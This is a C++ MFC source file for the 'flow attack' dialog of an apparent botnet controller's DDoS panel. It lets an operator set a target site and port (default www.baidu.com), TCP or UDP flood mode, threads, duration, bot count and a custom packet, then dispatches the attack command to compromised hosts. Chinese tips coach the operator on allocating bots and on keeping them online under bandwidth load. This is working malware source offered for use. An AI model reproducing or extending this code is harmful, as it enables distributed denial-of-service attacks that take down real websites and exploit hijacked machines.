// FlowAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "FlowAttackDlg.h"
#include "DDOSAttackDlg.h"
//#include "PcView.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CFlowAttackDlg dialog
IMPLEMENT_DYNAMIC(CFlowAttackDlg, CDialog)

CFlowAttackDlg::CFlowAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFlowAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CFlowAttackDlg)
	m_Decimal = _T("");
	m_HexData = _T("");
	m_HostNum = 200;
	m_SendRate = 3;
	m_Thread = 10;
	m_AttackTime = 60;
	m_Target = _T("www.baidu.com");
	m_Port = 80;
	m_Select = TRUE;
	m_TipShow = _T("");
	//}}AFX_DATA_INIT
	Point = NULL;
	m_Size = 0;
	iTaskID = 100;
	clr = RGB(0, 0, 0);
	m_brush.CreateSolidBrush(clr);
}




void CFlowAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CFlowAttackDlg)
	DDX_Control(pDX, IDC_COMBO_MODEL, m_ModelCtrl);
	DDX_Control(pDX, IDC_SLIDER_TIME, m_TimeCtrl);
	DDX_Control(pDX, IDC_SLIDER_THREAD, m_ThreadCtrl);
	DDX_Control(pDX, IDC_SPIN_RATE, m_RateCtrl);
	DDX_Control(pDX, IDC_CUSTOMATTACK_SPIN_NUM, m_HotsNumCtrl);
	DDX_Text(pDX, IDC_EDIT_DECIMAL, m_Decimal);
	DDV_MaxChars(pDX, m_Decimal, 2000);
	DDX_Text(pDX, IDC_EDIT_HEX, m_HexData);
	DDV_MaxChars(pDX, m_HexData, 5000);
	DDX_Text(pDX, IDC_HOSTNUMS, m_HostNum);
	DDV_MinMaxUInt(pDX, m_HostNum, 1, 20000);
	DDX_Text(pDX, IDC_SEND_RATE, m_SendRate);
	DDV_MinMaxUInt(pDX, m_SendRate, 1, 20000);
	DDX_Text(pDX, IDC_THREADNUMS, m_Thread);
	DDV_MinMaxUInt(pDX, m_Thread, 1, 100);
	DDX_Text(pDX, IDC_CUSTOMATTACKTIMES, m_AttackTime);
	DDV_MinMaxUInt(pDX, m_AttackTime, 1, 60000);
	DDX_Text(pDX, IDC_TARGET_WEB, m_Target);
	DDV_MaxChars(pDX, m_Target, 400);
	DDX_Text(pDX, IDC_CUSTOMATTACKPORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Check(pDX, IDC_SELECTHOST, m_Select);
	DDX_Text(pDX, IDC_EDIT_TIP, m_TipShow);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CFlowAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CFlowAttackDlg)
	ON_EN_CHANGE(IDC_EDIT_DECIMAL, OnChangeEditDecimal)
	ON_EN_SETFOCUS(IDC_EDIT_DECIMAL, OnSetfocusEditDecimal)
	ON_EN_SETFOCUS(IDC_EDIT_HEX, OnSetfocusEditHex)
	ON_EN_CHANGE(IDC_EDIT_HEX, OnChangeEditHex)
	ON_WM_SIZE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_TIME, OnCustomdrawSliderTime)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_THREAD, OnCustomdrawSliderThread)
	ON_BN_CLICKED(IDC_START_ATTACK, OnStartAttack)
	ON_BN_CLICKED(IDC_START_STOP, OnStartStop)
	ON_BN_CLICKED(IDC_SELECTHOST, OnSelecthost)
	ON_EN_CHANGE(IDC_TARGET_WEB, OnChangeTargetWeb)
	ON_EN_SETFOCUS(IDC_TARGET_WEB, OnSetfocusTargetWeb)
	ON_CBN_SETFOCUS(IDC_COMBO_MODEL, OnSetfocusComboModel)
	ON_CBN_SELCHANGE(IDC_COMBO_MODEL, OnSelchangeComboModel)
	ON_EN_SETFOCUS(IDC_THREADNUMS, OnSetfocusThreadnums)
	ON_EN_CHANGE(IDC_THREADNUMS, OnChangeThreadnums)
	ON_EN_CHANGE(IDC_CUSTOMATTACKTIMES, OnChangeAttacktimes)
	ON_EN_SETFOCUS(IDC_CUSTOMATTACKTIMES, OnSetfocusAttacktimes)
	ON_EN_SETFOCUS(IDC_SEND_RATE, OnSetfocusSendRate)
	ON_EN_CHANGE(IDC_SEND_RATE, OnChangeSendRate)
	ON_EN_CHANGE(IDC_HOSTNUMS, OnChangeHostnums)
	ON_EN_SETFOCUS(IDC_HOSTNUMS, OnSetfocusHostnums)
	ON_EN_CHANGE(IDC_CUSTOMATTACKPORT, OnChangeAttckport)
	ON_EN_SETFOCUS(IDC_CUSTOMATTACKPORT, OnSetfocusAttckport)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP

END_MESSAGE_MAP()


BEGIN_EASYSIZE_MAP(CFlowAttackDlg)

	//EASYSIZE(control,left,top,right,bottom,options)
	//ES_BORDER表示控件与对话框边界（以下简称边界）的距离；
	//ES_KEEPSIZE表示控件水平/垂直方向上尺寸保持不变
	//控件ID值表示当前控件与指定控件之间的距离
	//ES_HCENTER表示缩放后控件在指定位置内水平居中
	//ES_VCENTER表示缩放后控件在指定位置内垂直居中
	 // l  t r b 
	EASYSIZE(IDC_EDIT_DECIMAL, ES_BORDER, ES_BORDER, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_EDIT_HEX, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_EDIT_TIP, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	
	EASYSIZE(IDC_STATIC_20, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_2, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_3, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_TARGET_WEB, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_COMBO_MODEL, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_4, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_CUSTOMATTACKPORT, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_7, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_8, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_SLIDER_THREAD, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_SLIDER_TIME, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_11, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_THREADNUMS, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_CUSTOMATTACKTIMES, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_STATIC_6, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_SEND_RATE, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_HOSTNUMS, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_SPIN_RATE, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_CUSTOMATTACK_SPIN_NUM, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_SELECTHOST, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_START_ATTACK, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_START_STOP, ES_KEEPSIZE, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)




END_EASYSIZE_MAP

/////////////////////////////////////////////////////////////////////////////
// CFlowAttackDlg message handlers
static TCHAR TempBuffer[5000] = { NULL };

//返回值不为空  使用完后 必须delete掉返回的缓冲区..
//字符串转换为 十六进制字符串
//返回值 如果失败 返回 NULL
static CHAR ResultDec[5000] = { NULL };

LPSTR DecimalToHex(LPSTR Transition = NULL)
{

	if (Transition == NULL || strlen(Transition) == NULL)
		return NULL;
	ZeroMemory(ResultDec, sizeof(ResultDec));

	WORD Size = strlen(Transition);

	CHAR Temp[5] = { NULL };

	for (WORD i = 0; i < Size; i++)
	{
		sprintf_s(Temp, 4, "%02X ", (UCHAR)Transition[i] & 255);
		strcat_s(ResultDec, Temp);
	}
	return ResultDec;
}


WORD CFlowAttackDlg::ForMatFlowAddr(LPWSTR szAddr, WORD iPort)
{

	TCHAR* Point = _tcsstr(szAddr, _T("http://"));
	if (Point)
		Point += 7;
	else
		Point = szAddr;

	TCHAR Addr[400] = { NULL };
	lstrcpy(Addr, Point);

	Point = Addr;
	TCHAR* Temp = _tcsstr(Addr, _T("/"));
	if (Temp)
		*Temp = '\0';

	TCHAR* Port = _tcsstr(Point, _T(":"));

	if (Port)
	{
		*Port = _T('\0');
		Port++;
		lstrcpy(szAddr, Addr);
		return _tstoi(Port);
	}

	lstrcpy(szAddr, Addr);
	return iPort;
}

void CFlowAttackDlg::OnStartAttack()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	//过滤掉一些特殊的字符....
	if (m_Port < 0 || m_Port >65535)
	{
		MessageBox(_T("端口错误!"));
		return;
	}
	if (m_Target.GetLength() <= 0 || m_Target.GetLength() > 400)
	{
		MessageBox(_T("目标错误!"));
		return;
	}

	ATTACK m_Attack;
	m_Port = ForMatFlowAddr(m_Target.GetBuffer(0), m_Port);

	lstrcpy(m_Attack.Target, m_Target);

	m_Attack.AttackPort = m_Port;
	m_Attack.AttackTime = m_AttackTime;
	m_Attack.AttackThread = m_Thread;
	m_Attack.ExtendData2 = m_SendRate * 1000;

	//得到发包类型
	CString szType;
	GetDlgItemText(IDC_COMBO_MODEL, szType);

	if (szType == _T("TCP 发包"))
		m_Attack.AttackType = CUSTOM_TCPSEND;
	if (szType == _T("UDP 发包"))
		m_Attack.AttackType = CUSTOM_UDPSEND;


	//封装数据包 只封装16进制
	ZeroMemory(TempBuffer, 5000);
	m_Size = 0;
	GetDlgItemText(IDC_EDIT_HEX, TempBuffer, 5000);

	LPWSTR Data = HexToDecimal(TempBuffer, FALSE);//注意这里 不需要格式化 要原始数据包


	CString W;
	CStringA A;
	W = Data;
	A = W;
	memcpy(m_Attack.SendData, A.GetBuffer(), m_Size);
	//得到数据包的大小..
	m_Attack.DataSize = m_Size;


	signed int HostNums = -1;
	if (m_Select)
		HostNums = -1;
	else
		HostNums = m_HostNum;

	CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;
	WORD Ret = m_Point->SendDDosAttackCommand(&m_Attack, HostNums, iTaskID);

	CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
	CString szShow;
	szShow.Format(_T("成功发送 %d 条开始命令 任务ID:%d"), Ret, iTaskID);
	m_AttackPoint->StatusTextOut(0, szShow);

	GetDlgItem(IDC_START_ATTACK)->EnableWindow(FALSE);
	GetDlgItem(IDC_START_STOP)->EnableWindow(TRUE);
}

BOOL CFlowAttackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here

	//if (Point == NULL || ViewPoint == NULL)
	//{
	//	MessageBox(_T("初始化界面失败!"));
	//}









	m_HotsNumCtrl.SetRange(1, 20000);
	m_HotsNumCtrl.SetPos(200);
	m_HotsNumCtrl.SetBuddy(GetDlgItem(IDC_HOSTNUMS));


	m_RateCtrl.SetRange(1, 20000);
	m_RateCtrl.SetPos(200);
	m_RateCtrl.SetBuddy(GetDlgItem(IDC_SEND_RATE));

	m_ThreadCtrl.SetRange(1, 100);
	m_ThreadCtrl.SetPos(10);

	m_TimeCtrl.SetRange(1, 600);
	m_TimeCtrl.SetPos(60);

	m_ModelCtrl.SetCurSel(0);

	TCHAR SendBuffer[] =
		_T("GET /dosmonitor.exe HTTP/1.1\r\n")
		_T("Accept: application/x-shockwave-flash, image/gif, ")
		_T("image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, ")
		_T("application/vnd.ms-powerpoint, application/msword, application/xaml+xml, ")
		_T("application/x-ms-xbap, application/x-ms-application, application/QVOD, application/QVOD, */*\r\n")
		_T("Accept-Language: zh-cn\r\n")
		_T("Accept-Encoding: gzip, deflate\r\n")
		_T("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E; TheWorld)\r\n")
		_T("Host: localhost:8080\r\n")
		_T("Connection: Keep-Alive\r\n")
		_T("\r\n")
		_T("\r\n");

	SetDlgItemText(IDC_EDIT_DECIMAL, SendBuffer);

	CString w; CStringA a;
	w = SendBuffer; a = w;

	a = DecimalToHex(a.GetBuffer());
	w = a;

	SetDlgItemText(IDC_EDIT_HEX, w);
	GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
	GetDlgItem(IDC_CUSTOMATTACK_SPIN_NUM)->EnableWindow(FALSE);

	INIT_EASYSIZE;

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CFlowAttackDlg::OnChangeEditDecimal()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	if (m_MarkPos)
		return;

	m_TipShow = _T("字符编辑.可以从抓包软件复制数据!");
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);

	ZeroMemory(TempBuffer, 5000);

	GetDlgItemText(IDC_EDIT_DECIMAL, TempBuffer, 5000);

	CString w; CStringA a;
	w = TempBuffer; a = w;

	a = DecimalToHex(a.GetBuffer());
	w = a;




	SetDlgItemText(IDC_EDIT_HEX, w);

	int i = ((CEdit*)GetDlgItem(IDC_EDIT_HEX))->GetLineCount();

	((CEdit*)GetDlgItem(IDC_EDIT_HEX))->LineScroll(i);
}

void CFlowAttackDlg::OnSetfocusEditDecimal()
{
	// TODO: Add your control notification handler code here
	m_MarkPos = FALSE;
}

void CFlowAttackDlg::OnSetfocusEditHex()
{
	// TODO: Add your control notification handler code here
	m_MarkPos = TRUE;
}


TCHAR CFlowAttackDlg::htod(TCHAR c)
{
	c = _totlower(c);
	if (c >= 48 && c <= 57)
		return TCHAR(c - 48);
	if (c >= 97 && c <= 102)
		return TCHAR(c - 97 + 10);

	return FALSE;
}

static TCHAR ResultHex[5000] = { NULL };

LPWSTR CFlowAttackDlg::HexToDecimal(LPWSTR Transition, BOOL Format)
{
	if (Transition == NULL)
		return NULL;
	m_Size = 0;

	ZeroMemory(ResultHex, sizeof(ResultHex));

	WORD Size = lstrlen(Transition);

	if (Size > sizeof(ResultHex))
		return NULL;

	TCHAR Temp = 0;
	WORD iCount = 0;
	for (WORD i = 0; i < Size; i++)
	{
		if (Transition[i] == ' ' || Transition[i] == '\r' || Transition[i] == '\n')
			continue;
		Temp = htod(Transition[i]) * 16;
		i++;
		Temp += htod(Transition[i]);
		if (Format)
			if (Temp == 0) Temp = '.';

		ResultHex[iCount] = Temp;
		iCount++;
	}
	m_Size = iCount;
	return ResultHex;
}


BOOL CheckString(TCHAR c)
{
	if (c == _T(' ') || c == _T('\r') || c == _T('\n'))
		return TRUE;

	if (c < 48)
		return FALSE;
	if (c > 57 && c < 97)
		return FALSE;
	if (c > 102)
		return FALSE;

	return TRUE;
}

void CFlowAttackDlg::OnChangeEditHex()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	if (!m_MarkPos)
		return;

	m_TipShow = "16 进制代码 可以从 任何抓包软件上复制标准的16进制数据.";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);

	ZeroMemory(TempBuffer, 5000);

	int len = GetDlgItemText(IDC_EDIT_HEX, TempBuffer, 5000);
	TCHAR CheckStr[5000] = { NULL };
	lstrcpy(CheckStr, TempBuffer);


	//检测是否有不合法的字符
	WORD i = 0;
	for (i = 0; i < len; i++)
	{
		//转换为小写 手工.
		if (CheckStr[i] >= 65 && CheckStr[i] <= 90)
			CheckStr[i] += 32;


		if (!CheckString(CheckStr[i]))
		{
			MessageBox(_T("该数值不是16进制!!"), _T("警告"), MB_OK | MB_ICONWARNING);
			return;
		}
	}
	SetDlgItemText(IDC_EDIT_DECIMAL, HexToDecimal(TempBuffer, TRUE));

	i = ((CEdit*)GetDlgItem(IDC_EDIT_DECIMAL))->GetLineCount();

	((CEdit*)GetDlgItem(IDC_EDIT_DECIMAL))->LineScroll(i);
}


void CFlowAttackDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	UPDATE_EASYSIZE;
}

void CFlowAttackDlg::OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_AttackTime = m_TimeCtrl.GetPos();
	SetDlgItemInt(IDC_CUSTOMATTACKTIMES, m_AttackTime);
	m_TipShow = "时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n"
		"那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
	*pResult = 0;
}

void CFlowAttackDlg::OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_Thread = m_ThreadCtrl.GetPos();
	SetDlgItemInt(IDC_THREADNUMS, m_Thread);
	ShowThreads();
	*pResult = 0;
}


void CFlowAttackDlg::OnStartStop()
{
	// TODO: Add your control notification handler code here
	CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;

	WORD Ret = m_Point->SendDDostStopCommand(iTaskID);

	CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
	CString szShow;
	//szShow.Format("成功发送 %d 条停止命令 任务ID:%d", Ret, iTaskID);
	m_AttackPoint->StatusTextOut(0, szShow);

	GetDlgItem(IDC_START_ATTACK)->EnableWindow(TRUE);
	GetDlgItem(IDC_START_STOP)->EnableWindow(FALSE);

}

void CFlowAttackDlg::OnSelecthost()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	if (m_Select)
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
		GetDlgItem(IDC_CUSTOMATTACK_SPIN_NUM)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(TRUE);
		GetDlgItem(IDC_CUSTOMATTACK_SPIN_NUM)->EnableWindow(TRUE);
	}
}

//攻击
void CFlowAttackDlg::OnChangeTargetWeb()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确,如果是TCP 模式 请确定是否可以连接上目标! UDP 可以忽略!");
	SetDlgItemText(IDC_EDIT_TIP, temp);
}

void CFlowAttackDlg::OnSetfocusTargetWeb()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确,如果是TCP 模式 请确定是否可以连接上目标! UDP 可以忽略!");
	SetDlgItemText(IDC_EDIT_TIP, temp);
}


//模式
void CFlowAttackDlg::OnSetfocusComboModel()
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_MODEL, temp);

	if (temp == "TCP 发包")
		m_TipShow = "TCP 是面向连接的 既 会建立一个连接.连接成功才能发送数据\r\n";
	if (temp == "UDP 发包")
		m_TipShow = "UDP 是无连接 只发送数据包 不管对方是否接受到这个数据包\r\n";

	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}

void CFlowAttackDlg::OnSelchangeComboModel()
{
	// TODO: Add your control notification handler code here

}
VOID CFlowAttackDlg::ShowThreads()
{
	if (m_Thread <= 20)
		m_TipShow = "线程一般,主机CPU占用20%左右,宽带占用60%上下,不容易造成主机掉线";
	if (m_Thread > 20 && m_Thread < 40)
		m_TipShow = "线程过高,主机CPU占用50%左右,宽带占用80%上下,容易造成主机宽带耗尽,并且掉线";
	if (m_Thread > 40 && m_Thread < 100)
		m_TipShow = "线程过高,主机CPU占用80%以上,宽带耗尽,比如无法接收停止命令,并且极易造成主机掉线,死机,请酌情考虑!";

	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}


//线程发送改变
void CFlowAttackDlg::OnSetfocusThreadnums()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}
void CFlowAttackDlg::OnChangeThreadnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.
	UpdateData(TRUE);
	ShowThreads();
	// TODO: Add your control notification handler code here	
}
//时间发生改变
void CFlowAttackDlg::OnChangeAttacktimes()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = "时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n"
		"那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.单位为分钟";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}

void CFlowAttackDlg::OnSetfocusAttacktimes()
{
	// TODO: Add your control notification handler code here
	m_TipShow = "时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n"
		"那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.单位为分钟";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}

//发包速度发生改变
void CFlowAttackDlg::OnSetfocusSendRate()
{
	// TODO: Add your control notification handler code here
	m_TipShow = "时间单位为秒 控制发包的速度 既发送一个数据包 休息多少秒.";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}

void CFlowAttackDlg::OnChangeSendRate()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = "时间单位为秒 控制发包的速度 既发送一个数据包 休息多少秒.";
	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}


//主机数量发生改变
void CFlowAttackDlg::OnChangeHostnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = "合理的分配主机 才能实现多目标攻击 发送攻击时 会跳过已经在攻击中的主机!\r\n"
		"只有空闲主机才接收命令 请自行计算! 详细请看 在线主机->DDOS状态.";

	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}

void CFlowAttackDlg::OnSetfocusHostnums()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("合理的分配主机 才能实现多目标攻击 发送攻击时 会跳过已经在攻击中的主机!\r\n")
		_T("只有空闲主机才接收命令 请自行计算! 详细请看 在线主机->DDOS状态.");

	SetDlgItemText(IDC_EDIT_TIP, m_TipShow);
}


//端口发生改变
void CFlowAttackDlg::OnChangeAttckport()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确，如果目标是网站，目标必须保证在浏览器里面可以打开!\r\n")
		_T("如果选择的是TCP模式,可以切换到生成服务端窗口,有简单的测试连接工具!其他模式无法测试 须自行判断!");
	SetDlgItemText(IDC_EDIT_TIP, temp);
}

void CFlowAttackDlg::OnSetfocusAttckport()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确，如果目标是网站，目标必须保证在浏览器里面可以打开!\r\n")
		_T("如果选择的是TCP模式,可以切换到生成服务端窗口,有简单的测试连接工具!其他模式无法测试 须自行判断!");
	SetDlgItemText(IDC_EDIT_TIP, temp);
}

HBRUSH CFlowAttackDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_TIP) && (nCtlColor == CTLCOLOR_EDIT))
	{
		 clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //设置白色的文本
		CFont font;
		font.CreatePointFont(90, _T("宋体"));
		CFont* pOldFont=pDC->SelectObject(&font);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		font.DeleteObject();
		pDC->SelectObject(pOldFont);
		return m_brush;  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}


